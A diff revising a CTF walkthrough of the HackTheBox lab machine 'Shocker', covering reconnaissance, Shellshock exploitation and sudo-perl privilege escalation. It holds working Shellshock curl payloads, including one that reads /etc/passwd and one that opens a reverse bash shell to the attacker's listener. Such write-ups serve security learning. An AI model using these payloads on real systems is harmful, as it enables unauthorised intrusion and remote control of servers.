@@ -4,7 +4,7 @@
 # CTF Writeup:
 # Shocker on HackTheBox
 <br>
-![a0-logo](https://cdn.discordapp.com/attachments/361185466101530626/414537232020406272/glitchygif.gif)
+![a0-logo](https://i.imgur.com/Fs0cms1.png)
 <br>
 ## 17 February 2018
 
@@ -12,23 +12,22 @@
 
 ## Introduction
 
-Shocker is one of those CTF's designed to for the player to experience a major vulnerability.
+Shocker is one of those CTF's designed to give the player first-hand experience implementing a famous vulnerability.
 Like [Blue](Blue-HTB.md) before it, it is a beginner CTF that requires prior knowledge or a bit of outside-the-box thinking.
 
-Due to the severity of these vulnerabilities, however, once you've exploited it, it is pretty smooth sailing. Shocker's root doesn't crack exactly as easily as Blue, but is still pretty trivial.
+The severity of these vulnerabilities is what made them so famous, and once you've employed them, root access is not far behind. Shocker's root doesn't crack exactly as easily as Blue's, but is still a trivial privesc.
 
-I recommend it to
 
 This write up assumes that the reader is using Kali, but any pentesting distro such as [BlackArch](https://blackarch.org/) will work.
 
 
-
+<br>
 
 ## 1. Initial Scans
 
-A quick `nmap` scan will start us off.
+A quick `nmap` scan starts us off on the right foot.
 
-nmap -F -sV 10.10.10.56 -oG nmap_quicksearch
+* `nmap -F -sV 10.10.10.56 -oG nmap_quicksearch`
 
 
 We'll write the output to a `grep`-able format using the  `-oG` flag.
@@ -46,8 +45,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.08 seconds
 ```
 
-We'll be starting with HTTP, it seems.
-`nikto` and [dirsearch](https://github.com/maurosoria/dirsearch) - do your stuff!
+Looks like HTTP is the way to move forward. <br>
+If we hit a brick wall, we'll come back and scan more ports.
+
+`nikto` and [dirsearch](https://github.com/maurosoria/dirsearch) are the HTTP-scanning gruesome twosome. Let's set them loose.
 
 
 
@@ -73,10 +74,13 @@ We'll be starting with HTTP, it seems.
 + 1 host(s) tested
 ```
 
-`nikto` has told us the same information that the `nmap` quickscan has.
+`nikto` has told us the same information that the `nmap` quickscan has, but not much else.
+
+* The box runs Apache 2.4.18
+* The box runs Ubuntu
 
 
-We'll start with the shallowest dirsearch scan, and dive deeper if necessary.
+We'll start with the shallowest `dirsearch` scan, and dive deeper if necessary.
 
 * `dirsearch -u 'http://10.10.10.56' -e php,html,js,txt --plain-text-report = dirsearch_quick`
 
@@ -97,44 +101,45 @@ Target: http://10.10.10.56
 ```
 
 
-Those directories appear to be the most interesting, but let's try our patented "dual bio-optical" scan program.
+Those directories are the most interesting, but let's try our patented *"dual bio-optical scan."*
+
 
 <br>
 ![sitescreenshot](https://i.imgur.com/NubtDDU.png)
 <br>
 
-This monster creature wants to be left alone and is willing to defend himself with that hammer if needed.
+
+
+This creature wants to be left alone and appears willing to defend itself with that hammer if needed. <br>
+
 What a strange little image.
 
-We can download it and check it for steganography, but I wasn't able to find anything.
-Since this image is our only lead on the webpage, I thought it was worth a bit of further investigation.
 
-
-I took a page from the OSINT book and hit it with a reverse image search.
+We can download it and check it for steganography, but I wasn't able to find anything. <br>
+Since this image is our only lead on the webpage, it is worth further investigation. <br>
+Take a page from the OSINT book and hit it with a reverse image search.
 
 <br>
 ![malwarebug](https://i.imgur.com/mwLt5In.png)
 <br>
 
 
-Hmm... these results are pretty non-specific. <br>
+Hmm... these results aren't very specific. Maybe we can add more detail to our search and get better results. <br>
+
 Our bug has a message for us, *"Don't bug me!"* <br>
- We can add that to our search
 
 <br>
 ![dontbugme](https://i.imgur.com/Oei75Wb.png)
 <br>
 
-At first, these results seem similar to our first.<br> However, a very interesting result lies just down the page
+At first, these results seem similar to our first search. They might even be worse.<br> However, a very interesting result lies just a scroll down the page.
 
 <br>
 ![goingbyshellshock](https://i.imgur.com/fHiBgTy.png)
 <br>
 
 
-The included text tells a very interesting story:
-
-
+The included text tells a very interesting story: <br>
 *The Bash Bug - also going by the nickname "Shellshock" - has been discovered this week and identified as a serious threat to computers of al kinds...*
 
 
@@ -146,22 +151,24 @@ We'd like to pose a "serious threat" to this CTF, and with a box name of __Shock
 ## 2. Bashing the Bug/Shocking the Shell
 
 
-We originally found the image at [this Slashgear article](https://www.slashgear.com/bash-bug-affects-os-x-linux-worse-than-heartbleed-25347915/), which itself linked to [this Seclists post](http://seclists.org/oss-sec/2014/q3/650). The SecLists post explained that using a clever combination of curly brackets and semicolons in an HTTP request, we may be able to inject code that runs on a webserver.
+We originally found the image at [this Slashgear article](https://www.slashgear.com/bash-bug-affects-os-x-linux-worse-than-heartbleed-25347915/), which itself linked to [this SecLists post](http://seclists.org/oss-sec/2014/q3/650).<br> The SecLists post explained that using a clever combination of curly brackets and semicolons in an HTTP request, we may be able to get code injection on a webserver.
 
 
-Our box is nothing but a webserver, as far as we can tell, and we can use `curl` to send custom HTTP requests. We need to find out just where to send it.
+Our box is nothing but a webserver, as far as we can tell. We can use `curl` to send custom HTTP requests, as soon as we find out just where they should go.
 
 
-Some more searching lead me to [this GitHub page by opsxcq](https://github.com/opsxcq/exploit-CVE-2014-6271) which outlined a beautiful one-line command to read the `/etc/passwd` file of a system.
+Some more searching lead me to [this GitHub page by opsxcq](https://github.com/opsxcq/exploit-CVE-2014-6271) which outlined a beautiful one-line command to read the `/etc/passwd` file of a system vulnerable to ShellShock.
 
 ```
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
 http://localhost:8080/cgi-bin/vulnerable
 ```
 
+Where could our `/vulnerable` file be?
 
-`dirsearch` discovered that our box has a `/cgi-bin/` directory.
-Maybe there is a shell script in that directory we can tap in to.
+In order to use ShellShock, we need to aim our request at a shell script. Shell scripts often carry the `.sh` extension, and are used to run commands directly in the system shell.
+The `/cat/passwd` example used a `/cgi-bin/` directory, which we have already discovered exists on our box as well. We can point dirsearch at our box's `/cgi-bin/` directory and tell it to look for files with the `sh` extension.
+
 
 * `dirsearch -u 'http://10.10.10.56/cgi-bin/' -e sh --plain-text-report=dirsearch_shellsearch`
 
@@ -184,14 +191,15 @@ We can alter opsxcq's one liner to include the correct HTTP location and give it
 <br>
 
 
-We've done it, command injection.
+We've done it, command injection. <br>
 Time to drop in a revere shell command.
 
 First, start your listener.
 
 * `nc -lnvp PORTNUM`
 
-Then, run the RevShell shellshock command in another terminal.
+<br>
+Then, bundle a reverse shell command into the ShellShock one liner, and run it in another terminal.
 
 `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/local.machine.HTB.ip/PORTNUM 0>&1'" \http://10.10.10.56/cgi-bin/user.sh`
 
@@ -200,6 +208,7 @@ Then, run the RevShell shellshock command in another terminal.
 ![call_me_shelly](https://i.imgur.com/h9pFcs0.png)
 <br>
 
+<br>
 
 ## 3. A User Named "Shelly" - *__GET IT?__*
 
@@ -218,7 +227,7 @@ shelly@Shocker:/home/shelly$ cat ~/user.txt
 
 User Flag Captured!
 
-Time to see what Shelly can do.
+Time to see what Shelly can do besides make puns.
 
 * `sudo -l`
 
@@ -232,7 +241,8 @@ User shelly may run the following commands on Shocker:
 ```
 
 
-Shelly can run perl as root using `sudo` !
+Shelly can run perl as root using `sudo` without a password! <br>
+
 All that stands between us and a root shell is finding the right command.
 
 
@@ -249,12 +259,14 @@ Start a second listener on your local machine at a new port, then run the comman
 
 <br>
 ![rooted](https://i.imgur.com/p8A72wZ.png)
+
 <br>
+
 
 ## 4. Root Flag
 
 We're the boss.
-Now to just get the root flag.
+
 
 * `ls ~`
 * `cat ~/root.txt`
@@ -272,10 +284,11 @@ Root Flag Captured!
 ## Conclusion
 
 When doing CTFs, you have the benefit of decades of security history to support you.
-There is no substitute for experience, but browsing through the timeline of major cybersecurity stories might be the next best thing. Studying bugs like this give you an idea of real-world scenarios and what kinds of attacks actually have worked.
+There is no substitute for experience, but browsing through the timeline of major cybersecurity stories might just be the next best thing. Studying bugs like this give you an idea of real-world scenarios and what kinds of attacks actually have worked.
 
 
 
+Thanks to [HackTheBox](hackthebox.eu) and mrb3n!
 
 
 <br>
